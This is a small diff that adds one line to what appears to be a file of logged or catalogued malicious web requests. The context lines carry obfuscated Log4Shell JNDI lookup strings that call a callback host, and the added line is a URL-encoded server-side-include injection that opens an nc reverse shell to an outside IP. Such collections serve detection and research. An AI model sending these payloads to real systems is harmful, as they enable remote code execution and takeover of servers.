@@ -1139,3 +1139,4 @@ GET /favicon.ico HTTP/1.1" 404 524 "-" "${jndi:${lower:l}${lower:d}a${lower:p}:/
 GET /app/custom/assets/favicon/favicon.ico HTTP/1.1" 200 7406 "-" "${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}" "-"
 sh+/tmp/gpon80&ipv=0
 GET /asrsp.txt
+GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2031.220.3.140%209772%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e
